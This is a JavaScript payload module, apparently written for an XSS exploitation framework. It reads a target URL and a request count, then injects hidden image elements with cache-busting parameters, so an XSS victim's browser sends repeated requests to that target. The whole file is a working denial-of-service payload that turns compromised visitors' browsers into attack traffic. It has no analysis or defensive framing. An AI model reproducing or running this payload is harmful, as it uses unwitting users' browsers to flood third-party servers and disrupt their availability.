// get the options

var xssurl = decodeURIComponent(xssopt("url", "the url to DoS", "http://localhost"));
var xssrequests = xssopt("requests", "number of requests to send", "10");

// called after the DoS finishes
function xssdosfin() {
	debug(xssrequests + " DoS complete");
	xsscls();
}

debug("sending " + xssrequests + " requests to " + xssurl);
for (var i=0;i<xssrequests-1;i++) {
	var url2 = xssurl;
	if (xssurl.indexOf("?")>0) { url2 = xssurl + "&v="+i; }
	else { url2 = xssurl + "?v="+i; }
	ci(url2, "display:none;", "sploit", false, false);
}

// the last image has callbacks so we know when the last request is sent
ci(url2, "display:none;", "sploit", "xssdosfin()", "xssdosfin()");
debug("images added to document");
